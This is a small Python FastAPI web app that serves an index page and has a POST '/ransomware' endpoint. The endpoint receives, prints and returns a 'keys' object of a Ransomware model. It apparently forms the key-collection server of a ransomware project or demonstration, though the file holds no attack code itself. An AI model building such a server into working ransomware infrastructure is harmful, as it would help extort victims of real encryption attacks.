from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates


from src.models.ransomware import Ransomware


app = FastAPI()
app.mount("/static", StaticFiles(directory="src/static"), name="static")

templates = Jinja2Templates(directory="src/templates")


@app.get("/", response_class=HTMLResponse)
async def root(request: Request):
  return templates.TemplateResponse(
    request=request, name="index.html"
  )

@app.post("/ransomware")
async def ransomware(keys: Ransomware):
  print(keys)
  return keys